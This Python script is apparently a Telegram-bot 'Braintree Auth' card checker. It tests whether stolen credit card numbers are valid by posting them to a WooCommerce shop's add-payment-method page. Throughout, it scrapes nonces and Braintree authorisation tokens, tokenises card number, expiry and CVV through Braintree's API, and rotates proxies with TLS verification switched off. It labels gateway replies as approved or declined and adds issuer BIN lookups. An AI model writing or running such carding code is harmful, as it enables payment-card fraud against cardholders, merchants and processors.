import requests
import re
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import time
import json
import random
import urllib3
import glob

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
SELECTED_COOKIE_PAIR = None
user = generate_user_agent()

def discover_cookie_pairs():
    pattern1 = 'cookies_*-1.txt'
    pattern2 = 'cookies_*-2.txt'
    files1 = glob.glob(pattern1)
    files2 = glob.glob(pattern2)
    pairs = []
    for file1 in files1:
        pair_id = file1.replace('cookies_', '').replace('-1.txt', '')
        file2_expected = f'cookies_{pair_id}-2.txt'
        if file2_expected in files2:
            pairs.append({'id': pair_id, 'file1': file1, 'file2': file2_expected})
    return pairs

def select_new_cookie_pair_silent():
    global SELECTED_COOKIE_PAIR
    pairs = discover_cookie_pairs()
    if not pairs:
        SELECTED_COOKIE_PAIR = {'file1': 'cookies_1.txt', 'file2': 'cookies_2.txt', 'id': 'fallback'}
        return SELECTED_COOKIE_PAIR
    selected_pair = random.choice(pairs)
    SELECTED_COOKIE_PAIR = selected_pair
    return selected_pair

def read_cookies_from_file(filename):
    try:
        with open(filename, 'r') as f:
            content = f.read()
            namespace = {}
            exec(content, namespace)
            return namespace['cookies']
    except Exception:
        return {}

def get_domain_url():
    try:
        with open('site.txt', 'r') as f:
            return f.read().strip()
    except Exception:
        return ""

def get_cookies_1():
    global SELECTED_COOKIE_PAIR
    if SELECTED_COOKIE_PAIR is None:
        select_new_cookie_pair_silent()
    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file1'])

def get_cookies_2():
    global SELECTED_COOKIE_PAIR
    if SELECTED_COOKIE_PAIR is None:
        select_new_cookie_pair_silent()
    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file2'])

def get_headers():
    domain_url = get_domain_url()
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'dnt': '1',
        'priority': 'u=0, i',
        'referer': f'{domain_url}/my-account/payment-methods/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

def get_random_proxy():
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception:
        return None

def get_new_auth():
    domain_url = get_domain_url()
    cookies_1 = get_cookies_1()
    headers = get_headers()
    proxy = get_random_proxy()
    response = requests.get(
        f'{domain_url}/my-account/add-payment-method/',
        cookies=cookies_1,
        headers=headers,
        proxies=proxy,
        verify=False
    )
    if response.status_code == 200:
        add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not add_nonce:
            return None, None
        i0 = response.text.find('wc_braintree_client_token = ["')
        if i0 != -1:
            i1 = response.text.find('"]', i0)
            token = response.text[i0 + 30:i1]
            try:
                decoded_text = base64.b64decode(token).decode('utf-8')
                au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                if not au:
                    return None, None
                return add_nonce[0], au[0]
            except Exception:
                return None, None
        else:
            return None, None
    else:
        return None, None

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('brand', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN'),
                'level': data.get('brand', 'UNKNOWN'),
                'bank': data.get('bank', 'UNKNOWN'),
                'country': data.get('country_name', 'UNKNOWN'),
                'emoji': data.get('country_flag', '🏳️')
            }
        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }
    except Exception:
        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }

def check_status(result):
    if "Reason:" in result:
        reason_part = result.split("Reason:", 1)[1].strip()
        approved_patterns = [
            'Nice! New payment method added',
            'Payment method successfully added.',
            'Insufficient Funds',
            'Gateway Rejected: avs',
            'Duplicate',
            'Payment method added successfully',
            'Invalid postal code or street address',
            'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
        ]
        cvv_patterns = [
            'CVV',
            'Gateway Rejected: avs_and_cvv',
            'Card Issuer Declined CVV',
            'Gateway Rejected: cvv'
        ]
        for pattern in approved_patterns:
            if pattern in result:
                return "APPROVED", "Approved", True
        for pattern in cvv_patterns:
            if pattern in reason_part:
                return "DECLINED", "Reason: CVV", False
        return "DECLINED", reason_part, False

    approved_patterns = [
        'Nice! New payment method added',
        'Payment method successfully added.',
        'Insufficient Funds',
        'Gateway Rejected: avs',
        'Duplicate',
        'Payment method added successfully',
        'Invalid postal code or street address',
        'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    ]

    cvv_patterns = [
        'Reason: CVV',
        'Gateway Rejected: avs_and_cvv',
        'Card Issuer Declined CVV',
        'Gateway Rejected: cvv'
    ]
    for pattern in approved_patterns:
        if pattern in result:
            return "APPROVED", "Approved", True
    for pattern in cvv_patterns:
        if pattern in result:
            return "DECLINED", "Reason: CVV", False
    return "DECLINED", result, False

def check_card(cc_line):
    select_new_cookie_pair_silent()
    start_time = time.time()
    try:
        domain_url = get_domain_url()
        cookies_2 = get_cookies_2()
        headers = get_headers()
        add_nonce, au = get_new_auth()
        if not add_nonce or not au:
            return (
                "❌ <b>Braintree Auth</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "❌ Authorization failed. Try again later.\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
            )

        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': user
        }
        proxy = get_random_proxy()
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_token,
            json=json_data,
            proxies=proxy,
            verify=False
        )
        if response.status_code != 200:
            return (
                "❌ <b>Braintree Auth</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"❌ Tokenization failed. Status: {response.status_code}\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
            )
        token = response.json()['data']['tokenizeCreditCard']['token']
        headers_submit = headers.copy()
        headers_submit['content-type'] = 'application/x-www-form-urlencoded'
        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        proxy = get_random_proxy()
        response = requests.post(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_2,
            headers=headers,
            data=data,
            proxies=proxy,
            verify=False
        )
        elapsed_time = time.time() - start_time
        soup = BeautifulSoup(response.text, 'html.parser')
        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"

        status, reason, approved = check_status(message)
        bin_info = get_bin_info(n[:6]) or {}

        # New UI format (for bot):
        result = (
            f"{'✅' if approved else '❌'} <b>{status}</b>\n"
            f"<code>{n}|{mm}|{yy}|{cvc}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Gateway:</b> Braintree Auth\n"
            f"<b>Response:</b> {reason}\n"
            f"<b>BIN Info:</b> {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}\n"
            f"<b>Bank:</b> {bin_info.get('bank', 'UNKNOWN')}\n"
            f"<b>Country:</b> {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}\n"
            f"<b>Time:</b> {elapsed_time:.2f}s\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
        )
        return result

    except Exception as e:
        return (
            "❌ <b>Braintree Auth</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ Error: {str(e)}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
        )
